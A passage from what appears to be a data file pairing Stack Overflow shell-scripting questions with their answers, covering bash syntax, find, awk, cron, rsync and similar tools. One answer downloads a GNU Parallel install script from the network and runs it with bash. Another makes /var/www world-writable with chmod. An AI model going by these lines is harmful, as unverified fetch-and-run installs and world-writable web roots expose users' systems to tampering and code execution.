regular expressions are required or not. Putting the regular expression in a separate variable is a straightforward way around this, so that the condition works as expected in all bash versions that support the =~ match operator.",
    "Shell 'tar: not found in archive' error when using regular expression": "When you write\n tar -xzf *.gz\nyour shell expands it to the string:\n tar -xzf 1.gz 2.gz 3.gz\n(assuming 1.gz, 2.gz and 3.gz are in you current directory).\ntar thinks that you want to extract 2.gz and 3.gz from 1.gz; it can't find these files in the archives and that causes the error message.\nYou need to use loop for of command xargs to extract your files.\nls *.gz |xargs -n1 tar -xzf\nThat means: run me tar -xzf for every gz-file in the current directory.",
    "why am I getting Exec format error when I am writing my linux service?": "add shebang to the script\n#!/bin/bash\nsudo java -jar \"/home/ubuntu/FirstWebAppWithoutDB.jar\"\nand execution permission\nchmod +x spring-start.sh",
    "How do I change file permissions in Ubuntu [duplicate]": "So that you don't mess up other permissions already on the file, use the flag +, such as via\nsudo chmod -R o+rw /var/www",
    "Looping through all files in a directory [duplicate]": "For files and directories, not recursive\nfor filename in *; do echo \"put ${filename}\"; done\nFor files only (excludes folders), not recursive\nfor file in *; do \n    if [ -f \"$file\" ]; then \n        echo \"$file\" \n    fi \ndone\nFor a recursive solution, see Bennet Yee's answer.",
    "How to pass parameters to a Bash script?": "You use $1, $2 in your script. E.g:\ndate1=\"$1\"\ndate2=\"$2\"\nsed \"s/$date1/$date2/g\" wlacd_stat.xml >temp.xml\nmv temp.xml wlacd_stat.xml",
    "Activating a VirtualEnv using a shell script doesn't seem to work": "TLDR\nMust run the .sh script with source instead of the script solely\nsource your-script.sh\nand not your-script.sh\nDetails\nsh is not the same as bash (although some systems simply link sh to bash, so running sh actually runs bash). You can think of sh as a watered down version of bash. One thing that bash has that sh does not is the \"source\" command. This is why you're getting that error... source runs fine in your bash shell. But when you start your script using sh, you run the script in an shell in a subprocess. Since that script is running in sh, \"source\" is not found.\nThe solution is to run the script in bash instead. Change the first line to...\n#!/bin/bash\nThen run with...\n./virtualenv_activate.sh\n...or...\n/bin/bash virtualenv_activate.sh\nEdit:\nIf you want the activation of the virtualenv to change the shell that you call the script from, you need to use the \"source\" or \"dot operator\". This ensures that the script is run in the current shell (and therefore changes the current environment)...\nsource virtualenv_activate.sh\n...or...\n. virtualenv_activate.sh\nAs a side note, this is why virtualenv always says you need to use \"source\" to run it's activate script.  ",
    "What is start-stop-daemon in linux scripting?": "It is a program to manage the start and stop of system level background processes (daemons). You use it by passing in parameters (such as the pid file to create/check) and command arguments for the process you want to launch.\nThen, you do one of two things:\nstart-stop-daemon -S [other arguments] something\nstart something, if something wasn't already running. If it was running, do nothing.\nstart-stop-daemon -K [other arguments] something\nstop something. If something wasn't running, do nothing.\nThe man page provides more information on the various arguments. Typically a template is provided in /etc/init.d/ which has other commands for the init process that controls the running of background processes.\nWhat does it mean?\nstart-stop-daemon --start --background -m --oknodo --pidfile ${PIDFILE} --exec ${DAEMON} -- ${TARGETDIR}\n--background = launch as a background process\n-m = make a PID file. This is used when your process doesn't create its own PID file, and is used with --background\n--oknodo = return 0, not 1 if no actions are taken by the daemon\n--pidfile ${PIDFILE} = check whether the PID file has been created or not\n--exec = make sure the processes are instances of this executable (in your case, DAEMON)",
    "Unsetting persistent system properties": "",
    "Bash variables: case sensitive or not?": "Yes, it is case sensitive, just like the rest of UNIX. $date and $DATE are two different variables. makefile and Makefile are two different files. -h and -H are two distinct flags (usually).",
    "ZSH Agnoster Theme showing machine name": "It is the feature according to this; when we are sshing, the hostname will be shown.\nOverriding the function prompt_context or build_prompt on Agnoster theme will rescue. Putting below snippets at the very end of the ~/.zshrc for example.\n# redefine prompt_context for hiding user@hostname\nprompt_context () { }",
    "How to print only the hex values from hexdump without the line numbers or the ASCII table? [duplicate]": "Using xxd might be a better option for this task:\nxxd -p -l 50 -seek 10 file.bin\nFrom man xxd:\nxxd - make a hexdump or do the reverse.\n\n    -p | -ps | -postscript | -plain\n        output in postscript continuous hexdump style. Also known as plain hexdump style.\n\n    -l len | -len len\n        stop after writing <len> octets.\n \n    -seek offset\n        When used after -r: revert with <offset> added to file positions found in hexdump.",
    "watch file size on linux": "You're piping the output of watch into awk. If you simplify your command line, what you have is:\n watch <some arguments> | awk '{print $5}'\nThat's not what you want. Try:\nwatch -n 5 \"ls -lh club_prod.sql | awk '{print \\$5}'\"",
    "How to check if docker daemon is running?": "I made a little Script (Mac Osx) to ensure Docker is running by checking the exit code of docker stats.\n#!/bin/bash\n#Open Docker, only if is not running\nif (! docker stats --no-stream ); then\n  # On Mac OS this would be the terminal command to launch Docker\n  open /Applications/Docker.app\n #Wait until Docker daemon is running and has completed initialisation\nwhile (! docker stats --no-stream ); do\n  # Docker takes a few seconds to initialize\n  echo \"Waiting for Docker to launch...\"\n  sleep 1\ndone\nfi\n\n#Start the Container..",
    "How can I add a line to a file in a shell script?": "To answer your original question, here's how you do it with sed:\nsed -i '1icolumn1, column2, column3' testfile.csv\nThe \"1i\" command tells sed to go to line 1 and insert the text there.\nThe -i option causes the file to be edited \"in place\" and can also take an optional argument to create a backup file, for example\nsed -i~ '1icolumn1, column2, column3' testfile.csv\nwould keep the original file in \"testfile.csv~\".",
    "Count occurrences of character per line/field on Unix": "To count occurrence of a character per line you can do:\nawk -F'|' 'BEGIN{print \"count\", \"lineNum\"}{print gsub(/t/,\"\") \"\\t\" NR}' file\ncount lineNum\n4       1\n3       2\n6       3\nTo count occurrence of a character per field/column you can do:\ncolumn 2:\nawk -F'|' -v fld=2 'BEGIN{print \"count\", \"lineNum\"}{print gsub(/t/,\"\",$fld) \"\\t\" NR}' file\ncount lineNum\n1       1\n0       2\n1       3\ncolumn 3:\nawk -F'|' -v fld=3 'BEGIN{print \"count\", \"lineNum\"}{print gsub(/t/,\"\",$fld) \"\\t\" NR}' file\ncount lineNum\n2       1\n1       2\n4       3\ngsub() function's return value is number of substitution made. So we use that to print the number.\nNR holds the line number so we use it to print the line number.\nFor printing occurrences of particular field, we create a variable fld and put the field number we wish to extract counts from.",
    "Colour highlighting output based on regex in shell": "There is an answer in superuser.com:\nyour-command | grep -E --color 'pattern|$'\nor\nyour-command | grep --color 'pattern\\|$'\nThis will \"match your pattern or the end-of-line on each line. Only the pattern is highlighted...\"",
    "Is it possible to get the function name in function body? [duplicate]": "Try ${FUNCNAME[0]}. This array contains the current call stack. To quote the man page:\n   FUNCNAME\n          An  array  variable  containing the names of all shell functions\n          currently in the execution call stack.  The element with index 0\n          is the name of any currently-executing shell function.  The bot\u2010\n          tom-most element is \"main\".  This variable exists  only  when  a\n          shell  function  is  executing.  Assignments to FUNCNAME have no\n          effect and return an error status.  If  FUNCNAME  is  unset,  it\n          loses its special properties, even if it is subsequently reset.",
    "Counting number of files in a directory with an OSX terminal command": "You seem to have the right idea. I'd use -type f to find only files:\n$ find some_directory -type f | wc -l\nIf you only want files directly under this directory and not to search recursively through subdirectories, you could add the -maxdepth flag:\n$ find some_directory -maxdepth 1 -type f | wc -l",
    "How to get local application data folder in Java? [duplicate]": "System.getenv(\"APPDATA\")\n(there seems to be no env variable for the \"Local Settings\" folder, but this will give you the 'Application Data' folder)",
    "Best way to choose a random file from a directory in a shell script": "files=(/my/dir/*)\nprintf \"%s\\n\" \"${files[RANDOM % ${#files[@]}]}\"\nAnd don't parse ls. Read http://mywiki.wooledge.org/ParsingLs\nEdit: Good luck finding a non-bash solution that's reliable. Most will break for certain types of filenames, such as filenames with spaces or newlines or dashes (it's pretty much impossible in pure sh). To do it right without bash, you'd need to fully migrate to awk/perl/python/... without piping that output for further processing or such.",
    "scp stalled while copying large files": "An attempt at a comprehensive solution, as there could be several problems and limitations depending on your situation.\nrsync\nMy preferred option: using rsync doesn't give this problem and is a bit more versatile in my opinion, e.g. it keeps track of which files are already there, so if the connection ever does break it can pick up from where it left off - try the --partial flag too - among other things.\nInstead of\nscp local/path/some_file usr@server.com:\"/some/path/\"\nyou can just do\nrsync -avz --progress local/path/some_file usr@server.com:\"/some/path/\"\nI've tested this on several occasions when scp would give me the same problem it gave you - and now I just use rsync by default.\nLimit speed\nNot a solution for OP as the MTU is fixed in this situation (and probably not the issue here), but if the culprit is a slow/unreliable connection between the two drives, setting a speed limit reduces the delays which make the TCP connection stall - at the expense of a slower transfer of course. This is because scp grabs all the bandwidth it can get unless you specify the maximum data rate in kilobits, like so:\nscp -l 8192 local/path/some_file usr@server.com:\"/some/path/\"\nThis doesn't always work though.\nCompression option\nscp's -C option can speed up the transfer, reducing the probability that the transfer stalls.\nDisabling TCP SACK\nAs mentioned by the OP, and here.\nsudo sysctl -w net.ipv4.tcp_sack=0\n(or similar)\nLAN card MTU\nAgain an MTU fix, not necessarily of the transfer specifically though:\nifconfig eth0 mtu 1492\nor on newer (Linux) systems:\nip link set dev eth0 mtu 1492\nOther\nIf all else fails, this lists another handful of potential solutions not included here.\nThe more exotic hpn bug may be at fault too.",
    "Bash - how to put each line within quotation": "Using awk\nawk '{ print \"\\\"\"$0\"\\\"\"}' inputfile\nUsing pure bash\nwhile read FOO; do\n   echo -e \"\\\"$FOO\\\"\"\ndone < inputfile\nwhere inputfile would be a file containing the lines without quotes.\nIf your file has empty lines, awk is definitely the way to go:\nawk 'NF { print \"\\\"\"$0\"\\\"\"}' inputfile\nNF tells awk to only execute the print command when the Number of Fields is more than zero (line is not empty).",
    "Concatenating variables in Bash [duplicate]": "Try doing this, there's no special character to concatenate in bash :\nmystring=\"${arg1}12${arg2}endoffile\"\nexplanations\nIf you don't put brackets, you will ask\nbash\nto concatenate $arg112 + $argendoffile (I guess that's not what you asked) like in the following example :\nmystring=\"$arg112$arg2endoffile\"\nThe brackets are delimiters for the variables when needed. When not needed, you can use it or not.\nanother solution\n(less portable : require bash > 3.1)\n$ arg1=foo\n$ arg2=bar\n$ mystring=\"$arg1\"\n$ mystring+=\"12\"\n$ mystring+=\"$arg2\"\n$ mystring+=\"endoffile\"\n$ echo \"$mystring\"\nfoo12barendoffile\nSee http://mywiki.wooledge.org/BashFAQ/013",
    "Crontab Command Separate Line": "No, you can't do that. From the man page:\nThere is no way to split a single command line onto multiple lines, like the shell's trailing \"\\\".\nYou can put the commands in a script and run it.",
    "Bash shell Decimal to Binary base 2 conversion": "You can use bc as:\necho \"obase=2;$ip1\" | bc\nSee it",
    "How to Open files and folders in same window in Sublime Text on macOS?": "In Sublime Text Menu:\nPreferences ->  Settings - User\nLook for 'open_files_in_new_window'\nAnd change 'true' with 'false'",
    "check if environment variable is already set [duplicate]": "The standard solution to conditionally assign a variable (whether in the environment or not) is:\n: ${VAR=foo}\nThat will set VAR to the value \"foo\" only if it is unset.\nTo set VAR to \"foo\" if VAR is unset or the empty string, use:\n: ${VAR:=foo}\nTo put VAR in the environment, follow up with:\nexport VAR\nYou can also do export VAR=${VAR-foo} or export VAR=${VAR:=foo}, but some older shells do not support the syntax of assignment and export in the same line. Also, DRY; using the name on both sides of the = operator is unnecessary repetition. (A second line exporting the variable violates the same principal, but feels better.)\nNote that it is very difficult in general to determine if a variable is in the environment. Parsing the output of env will not work. Consider:\nexport foo='\nVAR=var-value'\nenv | grep VAR\nNor does it work to spawn a subshell and test:\nsh -c 'echo $VAR'\nThat would indicate the VAR is set in the subshell, which would be an indicator that VAR is in the environment of the current process, but it may simply be that VAR is set in the initialization of the subshell. Functionally, however, the result is the same as if VAR is in the environment. Fortunately, you do not usually care if VAR is in the environment or not. If you need it there, put it there. If you need it out, take it out.",
    "How to perform a for-each loop over all the files under a specified path?": "Here is a better way to loop over files as it handles spaces and newlines in file names:\n#!/bin/bash\n\nfind . -type f -iname \"*.txt\" -print0 | while IFS= read -r -d $'\\0' line; do\n    echo \"$line\"\n    ls -l \"$line\"    \ndone",
    "Commenting out a set of lines in a shell script": "The most versatile and safe method is putting the comment into a void quoted here-document, like this:\n<<\"COMMENT\"\n    This long comment text includes ${parameter:=expansion}\n    `command substitution` and $((arithmetic++ + --expansion)).\nCOMMENT\nQuoting the COMMENT delimiter above is necessary to prevent parameter expansion, command substitution and arithmetic expansion, which would happen otherwise, as Bash manual states and POSIX shell standard specifies.\nIn the case above, not quoting COMMENT would result in variable parameter being assigned text expansion, if it was empty or unset, executing command command substitution, incrementing variable arithmetic and decrementing variable expansion.\nComparing other solutions to this:\nUsing if false; then comment text fi requires the comment text to be syntactically correct Bash code whereas natural comments are often not, if only for possible unbalanced apostrophes. The same goes for : || { comment text } construct.\nPutting comments into a single-quoted void command argument, as in :'comment\ntext', has the drawback of inability to include apostrophes. Double-quoted arguments, as in :\"comment text\", are still subject to parameter expansion, command substitution and arithmetic expansion, the same as unquoted here-document contents and can lead to the side-effects described above.\nUsing scripts and editor facilities to automatically prefix each line in a block with '#' has some merit, but doesn't exactly answer the question.",
    "using OR in shell script": "You should be able to use || or -o I think as follows:\nif [ $uptime -lt 0 ] || [ $questions -lt 1 ] || [ $slow -gt 10 ]; then\n    some code\nfi",
    "How can I delete a file only if it exists?": "Pass the -f argument to rm, which will cause it to treat the situation where the named file does not exist as success, and will suppress any error message in that case:\nrm -f -- filename.log\nWhat you literally asked for would be more like:\n[ -e filename.log ] && rm -- filename.log\nbut it's more to type and adds extra failure modes. (If something else deleted the file after [ tests for it but before rm deletes it, then you're back at having a failure again).\nAs an aside, the --s cause the filename to be treated as literal even if it starts with a leading dash; you should use these habitually if your names are coming from variables or otherwise not strictly controlled.",
    "How to check if a string has spaces in Bash shell": "You can use regular expressions in bash:\nstring=\"a b '' c '' d\"\nif [[ \"$string\" =~ \\ |\\' ]]    #  slightly more readable: if [[ \"$string\" =~ ( |\\') ]]\nthen\n   echo \"Matches\"\nelse\n   echo \"No matches\"\nfi\nEdit:\nFor reasons obvious above, it's better to put the regex in a variable:\npattern=\" |'\"\nif [[ $string =~ $pattern ]]\nAnd quotes aren't necessary inside double square brackets. They can't be used on the right or the regex is changed to a literal string.",
    "Using Bash Script to Find Line Number of String in File": "Given that your example only prints the line number of the first occurrence of the string, perhaps you are looking for:\nawk '/line/{ print NR; exit }' input-file\nIf you actually want all occurrences (eg, if the desired output of your example is actually \"2\\n3\\n\"), omit the exit.",
    "Bash script, watch folder, execute command": "To continuously recursively monitor folder (md5) and execute a command on change:\ndaemon() {\n    chsum1=\"\"\n\n    while [[ true ]]\n    do\n        chsum2=`find src/ -type f -exec md5 {} \\;`\n        if [[ $chsum1 != $chsum2 ]] ; then           \n            if [ -n \"$chsum1\" ]; then\n                compile\n            fi\n            chsum1=$chsum2\n        fi\n        sleep 2\n    done\n}\nWorks on my OS X as I do not have digest.\nOn Linux, you can use md5sum as a replacement for the md5 command.",
    "In a bash script, how do I sanitize user input?": "As dj_segfault points out, the shell can do most of this for you. Looks like you'll have to fall back on something external for lower-casing the string, though. For this you have many options, like the perl one-liners above, etc., but I think tr is probably the simplest.\n# first, strip underscores\nCLEAN=${STRING//_/}\n# next, replace spaces with underscores\nCLEAN=${CLEAN// /_}\n# now, clean out anything that's not alphanumeric or an underscore\nCLEAN=${CLEAN//[^a-zA-Z0-9_]/}\n# finally, lowercase with TR\nCLEAN=`echo -n $CLEAN | tr A-Z a-z`\nThe order here is somewhat important. We want to get rid of underscores, plus replace spaces with underscores, so we have to be sure to strip underscores first. By waiting to pass things to tr until the end, we know we have only alphanumeric and underscores, and we can be sure we have no spaces, so we don't have to worry about special characters being interpreted by the shell.",
    "How to run system shell/terminal inside Eclipse?": "In some Eclipse packages, like STS or Eclipse for JEE Developers, the Terminal is already installed in your IDE. If not, you can install the TM Terminal from the Eclipse */release update site, as you can see in the image below.\nTo open the command prompt (shell or terminal) using the path of a project directory inside Eclipse, you just need to select the folder, and press Ctrl+Alt+T, or right-click and select Show In Local Terminal > Terminal.\nThen, the terminal will open in a new view inside Eclipse.",
    "How can I get awk to print without white space?": "Omit the ,s\nawk -F\\, '{print $2 \":\" $1}'",
    "How do I write a batch file which opens the GitBash shell and runs a command in the shell?": "\"C:\\Program Files (x86)\\Git\\bin\\sh.exe\" --login -i -c \"git archive master | tar -x -C $0\" \"%~1\"",
    "find -name \"*.xyz\" -o -name \"*.abc\" -exec to Execute on all found files, not just the last suffix specified": "find works by evaluating the expressions you give it until it can determine the truth value (true or false) of the entire expression. In your case, you're essentially doing the following, since by default it ANDs the expressions together.\n-name \"*.xyz\" OR ( -name \"*.abc\" AND -exec ... )\nQuoth the man page:\nGNU find searches the directory tree rooted at each given file name by evaluating the given expression from left to right, according to the rules of precedence (see section OPERATORS), until the outcome is known (the left hand side is false for and operations, true for or), at which point find moves on to the next file name.\nThat means that if the name matches *.xyz, it won't even try to check the latter -name test or -exec, since it's already true.\nWhat you want to do is enforce precedence, which you can do with parentheses. Annoyingly, you also need to use backslashes to escape them on the shell:\nfind ./ \\( -name \"*.xyz\" -o -name \"*.abc\" \\) -exec cp {} /path/i/want/to/copy/to \\;",
    "Escape backquote in a double-quoted string in shell": "You need to escape the backtick, but also escape the backslash:\n$ touch 1\\`\n$ /bin/sh -c \"ls 1\\\\\\`\"\n1`\nThe reason you have to escape it \"twice\" is because you're entering this command in an environment (such as a shell script) that interprets the double-quoted string once. It then gets interpreted again by the subshell.\nYou could also avoid the double-quotes, and thus avoid the first interpretation:\n$ /bin/sh -c 'ls 1\\`'\n1`\nAnother way is to store the filename in a variable, and use that value:\n$ export F='1`'\n$ printenv F\n1`\n$ /bin/sh -c 'ls $F'  # note that /bin/sh interprets $F, not my current shell\n1`\nAnd finally, what you tried will work on some shells (I'm using bash, as for the above examples), just apparently not with your shell:\n$ /bin/sh -c \"ls 1'\\`'\"\n1`\n$ csh  # enter csh, the next line is executed in that environment\n% /bin/sh -c \"ls 1'\\`'\"\nUnmatched `.\nI strongly suggest you avoid such filenames in the first place.",
    "Force mongodb to output strict JSON": "The MongoDB shell speaks Javascript, so the answer is simple: use JSON.stringify(). If your command is db.serverStatus(), then you can simply do this:\nJSON.stringify(db.serverStatus())\nThis won't output the proper \"strict mode\" representation of each of the fields ({ \"floatApprox\": <number> } instead of { \"$numberLong\": \"<number>\" }), but if what you care about is getting standards-compliant JSON out, this'll do the trick.",
    "Why don't I see pipe operators in most high-level languages?": "Haha! Thanks to my Google-fu, I have found an SO answer that may interest you. Basically, the answer is going against the \"don't overload operators unless you really have to\" argument by overloading the bitwise-OR operator to provide shell-like piping, resulting in Python code like this:\nfor i in xrange(2,100) | sieve(2) | sieve(3) | sieve(5) | sieve(7):\n    print i\nWhat it does, conceptually, is pipe the list of numbers from 2 to 99 (xrange(2, 100)) through a sieve function that removes multiples of a given number (first 2, then 3, then 5, then 7). This is the start of a prime-number generator, though generating prime numbers this way is a rather bad idea. But we can do more:\nfor i in xrange(2,100) | strify() | startswith(5):\n    print i\nThis generates the range, then converts all of them from numbers to strings, and then filters out anything that doesn't start with 5.\nThe post shows a basic parent class that allows you to overload two methods, map and filter, to describe the behavior of your pipe. So strify() uses the map method to convert everything to a string, while sieve() uses the filter method to weed out things that aren't multiples of the number.\nIt's quite clever, though perhaps that means it's not very Pythonic, but it demonstrates what you are after and a technique to get it that can probably be applied easily to other languages.",
    "Create django super user in a docker container without inputting password": "Get the container ID and run the command.\ndocker exec -it container_id python manage.py createsuperuser",
    "Merging two Bash arrays into key:value pairs via a Cartesian product": "If you don't care about having duplicates, or maintaining indexes, then you can concatenate the two arrays in one line with:\nNEW=(\"${OLD1[@]}\" \"${OLD2[@]}\")\nFull example:\nUnix=('Debian' 'Red hat' 'Ubuntu' 'Suse' 'Fedora' 'UTS' 'OpenLinux');\nShell=('bash' 'csh' 'jsh' 'rsh' 'ksh' 'rc' 'tcsh');\nUnixShell=(\"${Unix[@]}\" \"${Shell[@]}\")\necho ${UnixShell[@]}\necho ${#UnixShell[@]}\nCredit: http://www.thegeekstuff.com/2010/06/bash-array-tutorial/",
    "PostgreSQL CSV import from command line": "The solution in the accepted answer will only work on the server and when the user executing the query will have permissions to read the file as explained in this SO answer.\nOtherwise, a more flexible approach is to replace the SQL's COPY command with the psql's \"meta-command\" called \\copy which which takes all the same options as the \"real\" COPY, but is run inside the client (with no need for ; at the end):\npsql -c \"\\copy tbname FROM '/tmp/the_file.csv' delimiter '|' csv\"\nAs per docs, the \\copy command:\nPerforms a frontend (client) copy. This is an operation that runs an SQL COPY command, but instead of the server reading or writing the specified file, psql reads or writes the file and routes the data between the server and the local file system. This means that file accessibility and privileges are those of the local user, not the server, and no SQL superuser privileges are required.\nIn addition, if the the_file.csv contains the header in the first line, it can be recognized by adding header at the end of the above command:\npsql -c \"\\copy tbname FROM '/tmp/the_file.csv' delimiter '|' csv header\"",
    "How to write shell script for finding number of pages in PDF?": "Without any extra package:\nstrings < file.pdf | sed -n 's|.*/Count -\\{0,1\\}\\([0-9]\\{1,\\}\\).*|\\1|p' \\\n    | sort -rn | head -n 1\nUsing pdfinfo:\npdfinfo file.pdf | awk '/^Pages:/ {print $2}'\nUsing pdftk:\npdftk file.pdf dump_data | grep NumberOfPages | awk '{print $2}'\nYou can also recursively sum the total number of pages in all PDFs via pdfinfo as follows:\nfind . -xdev -type f -name \"*.pdf\" -exec pdfinfo \"{}\" \";\" | \\\n    awk '/^Pages:/ {n += $2} END {print n}'",
    "How come npm install doesn't work on git bash": "In our case, the solution was simply to close the Git bash window and re-open it.",
    "How to check with PHP if the script is being run from the console or browser request?": "",
    "How to run a python file using cron jobs": "Assuming you are using a unix OS, you would do the following.\nedit the crontab file using the command\ncrontab -e\nadd a line that resembles the one below\n*/2 * * * * /Desktop/downloads/file_example.py\nthis can be used to run other scripts simply use the path to the script needed i.e.\n*/2 * * * * /path/to/script/to/run.sh\nAn explanation of the timing is below (add a star and slash before number to run every n timesteps, in this case every 2 minutes)\n* * * * * command to be executed\n- - - - -\n| | | | |\n| | | | ----- Day of week (0 - 7) (Sunday=0 or 7)\n| | | ------- Month (1 - 12)\n| | --------- Day of month (1 - 31)\n| ----------- Hour (0 - 23)\n------------- Minute (0 - 59)",
    "Why does the equal to operator not work if it is not surrounded by spaces?": "test (or [ expr ]) is a builtin function. Like all functions in bash, you pass its arguments as whitespace separated words.\nAs the man page for bash builtins states: \"Each operator and operand must be a separate argument.\"\nIt's just the way bash and most other Unix shells work.\nVariable assignment is different.\nIn bash a variable assignment has the syntax: name=[value]. You cannot put unquoted spaces around the = because bash would not interpret this as the assignment you intend. bash treats most lists of words as a command with parameters.\nE.g.\n# call the command or function 'abc' with '=def' as argument\nabc =def\n\n# call 'def' with the variable 'abc' set to the empty string\nabc= def\n\n# call 'ghi' with 'abc' set to 'def'\nabc=def ghi\n\n# set 'abc' to 'def ghi'\nabc=\"def ghi\"",
    "Here document as an argument to bash function": "The way to that would be possible is:\nprintArgs 17 \"$(cat <<EOF\n18\n19\nEOF\n)\"\nBut why would you want to use a heredoc for this? heredoc is treated as a file in the arguments so you have to (ab)use cat to get the contents of the file, why not just do something like:\nprint Args 17 \"18\n19\"\nPlease keep in mind that it is better to make a script on the machine you want to ssh to and run that then trying some hack like this because bash will still expand variables and such in your multiline argument.",
    "How to set the From email address for mailx command?": "You can use the \"-r\" option to set the sender address:\nmailx -r me@example.com -s ...",
    "Bash: limit the number of concurrent jobs? [duplicate]": "If you have GNU Parallel http://www.gnu.org/software/parallel/ installed you can do this:\nparallel gzip ::: *.log\nwhich will run one gzip per CPU core until all logfiles are gzipped.\nIf it is part of a larger loop you can use sem instead:\nfor i in *.log ; do\n    echo $i Do more stuff here\n    sem -j+0 gzip $i \";\" echo done\ndone\nsem --wait\nIt will do the same, but give you a chance to do more stuff for each file.\nIf GNU Parallel is not packaged for your distribution you can install GNU Parallel simply by:\n$ (wget -O - pi.dk/3 || lynx -source pi.dk/3 || curl pi.dk/3/ || \\\n   fetch -o - http://pi.dk/3 ) > install.sh\n$ sha1sum install.sh | grep 883c667e01eed62f975ad28b6d50e22a\n12345678 883c667e 01eed62f 975ad28b 6d50e22a\n$ md5sum install.sh | grep cc21b4c943fd03e93ae1ae49e28573c0\ncc21b4c9 43fd03e9 3ae1ae49 e28573c0\n$ sha512sum install.sh | grep da012ec113b49a54e705f86d51e784ebced224fdf\n79945d9d 250b42a4 2067bb00 99da012e c113b49a 54e705f8 6d51e784 ebced224\nfdff3f52 ca588d64 e75f6033 61bd543f d631f592 2f87ceb2 ab034149 6df84a35\n$ bash install.sh\nIt will download, check signature, and do a personal installation if it cannot install globally.\nWatch the intro videos for GNU Parallel to learn more: https://www.youtube.com/playlist?list=PL284C9FF2488BC6D1",
    "How to read just a single character in shell script": "In bash, read can do it:\nread -n1 ans",
    "cp command should ignore some files": "To ignore a git directory specifically, I'd try git export first.\nBut in general, to copy a directory tree excluding certain files or folders, I'd recommend using rsync instead of cp. The syntax is mostly the same, but rsync has way more options, including one to exclude selected files:\nrsync -lrv --exclude=.git demo demo_bkp\nSee e.g. the man page for more info.",
    "Assign a makefile variable value to a bash command result?": "You will need to double-escape the $ character within the shell command:\nHEADER = $(shell for file in `find . -name *.h`;do echo $$file; done)\nThe problem here is that make will try to expand $f as a variable, and since it doesn't find anything, it simply replaces it with \"\". That leaves your shell command with nothing but echo ile, which it faithfully does.\nAdding $$ tells make to place a single $ at that position, which results in the shell command looking exactly the way you want it to.",
    "How to list specific type of files in recursive directories in shell?": "If you are more confortable with \"ls\" and \"grep\", you can do what you want using a regular expression in the grep command (the ending '$' character indicates that .doc must be at the end of the line. That will exclude \"file.doc.txt\"):\nls -R |grep \"\\.doc$\"\nMore information about using grep with regular expressions in the man.",
    "How to pipe output from grep to cp?": "grep -l -r \"TWL\" --exclude=*.csv* | xargs cp -t ~/data/lidar/tmp-ajp2/\nExplanation:\ngrep -l option to output file names only\nxargs to convert file list from the standard input to command line arguments\ncp -t option to specify target directory (and avoid using placeholders)",
    "How to retrieve PHP exec() error responses?": "",
    "How do I set MySQL temporarily to read-only through the command line?": "To answer your original question, you can put your whole database to read only mode by this commands:\nFLUSH TABLES WITH READ LOCK;\nSET GLOBAL read_only = 1;\nand back to normal mode with:\nSET GLOBAL read_only = 0;\nUNLOCK TABLES;\nBeware that this is an operation which will have deep impact on the behavior of the database. So before executing this, read the available documentation to the commands above. A much more common way is to revoke DML privileges from the specific user and afterwards grant them back.",
    "MAC's \"say\" command to MP3 [closed]": "I'm not on a Mac right now, so I can't test, but this page suggests you can do\nsay -f script.txt -o greetings.aiff\nto load what should be said from script.txt and save the audio output as greetings.aiff. You can then convert it to mp3 using lame with\nlame -m m greetings.aiff greetings.mp3\nDefinitely try the different voices. :D",
    "How to store the result of an executed shell command in a variable in python? [duplicate]": "Use the subprocess module instead:\nimport subprocess\noutput = subprocess.check_output(\"cat syscall_list.txt | grep f89e7000 | awk '{print $2}'\", shell=True)\nEdit: this is new in Python 2.7. In earlier versions this should work (with the command rewritten as shown below):\nimport subprocess\noutput = subprocess.Popen(['awk', '/f89e7000/ {print $2}', 'syscall_list.txt'], stdout=subprocess.PIPE).communicate()[0]\nAs a side note, you can rewrite\ncat syscall_list.txt | grep f89e7000\nTo\ngrep f89e7000 syscall_list.txt\nAnd you can even replace the entire statement with a single awk script:\nawk '/f89e7000/ {print $2}' syscall_list.txt\nLeading to:\nimport subprocess\noutput = subprocess.check_output(['awk', '/f89e7000/ {print $2}', 'syscall_list.txt'])",
    "How do I Invert search using grep for multiple strings of text": "You can use -e option multiple times in grep to skip multiple search items:\ngrep -v -e \"string one that I don't want\" -e \"string two that I don't want\" file.log\nOR else use regex using grep -E for extended regex support:\ngrep -vE 'string one|string two' file.log",
    "How do I use variables in single quoted strings?": "Variables are expanded in double quoted strings, but not in single quoted strings:\n $ name=World\n\n $ echo \"Hello $name\"\n Hello World\n\n $ echo 'Hello $name'\n Hello $name\nIf you can simply switch quotes, do so.\nIf you prefer sticking with single quotes to avoid the additional escaping, you can instead mix and match quotes in the same argument:\n $ echo 'single quoted. '\"Double quoted. \"'Single quoted again.'\n single quoted. Double quoted. Single quoted again.\n\n $ echo '\"$name\" has the value '\"$name\"\n \"$name\" has the value World\nApplied to your case:\n echo 'test text \"here_is_some_test_text_'\"$counter\"'\" \"output\"' >> \"$FILE\"",
    "How do I get my Golang web server to run in the background?": "Simple / Usable things first\nIf you want a start script without much effort (i.e. dealing with the process, just having it managed by the system), you could create a systemd service. See Greg's answer for a detailled description on how to do that. Afterwards you can start the service with\nsystemctl start myserver\nPreviously I would have recommended trying xinetd or something similar for finer granuarlity regarding resource and permission management but systemd already covers that.\nUsing the shell\nYou could start your process like this:\nnohup ./myexecutable &\nThe & tells the shell to start the command in the background, keeping it in the job list. On some shells, the job is killed if the parent shell exits using the HANGUP signal. To prevent this, you can launch your command using the nohup command, which discards the HANGUP signal.\nHowever, this does not work, if the called process reconnects the HANGUP signal.\nTo be really sure, you need to remove the process from the shell's joblist. For two well known shells this can be achieved as follows:\nbash:\n./myexecutable &\ndisown <pid>\nzsh:\n./myexecutable &!\nKilling your background job\nNormally, the shell prints the PID of the process, which then can be killed using the kill command, to stop the server. If your shell does not print the PID, you can get it using\necho $!\ndirectly after execution. This prints the PID of the forked process.",
    "Shellscript to monitor a log file if keyword triggers then execute a command?": "tail -fn0 logfile | \\\nwhile read line ; do\n        echo \"$line\" | grep \"pattern\"\n        if [ $? = 0 ]\n        then\n                ... do something ...\n        fi\ndone",
    "How to initialize a bash array with output piped from another command? [duplicate]": "You can execute the command under ticks and set the Array like,\nARRAY=(`command`)\nAlternatively, you can save the output of the command to a file and cat it similarly,\ncommand > file.txt\nARRAY=(`cat file.txt`)\nOr, simply one of the following forms suggested in the comments below,\nARRAY=(`< file.txt`)\nARRAY=($(<file.txt))",
    "Interrupt sleep in bash with a signal trap": "#!/bin/bash\n\ntrap 'echo \"Caught SIGUSR1\"' SIGUSR1\n\necho \"Sleeping.  Pid=$$\"\nwhile :\ndo\n   sleep 10 &\n   wait $!\n   echo \"Sleep over\"\ndone",
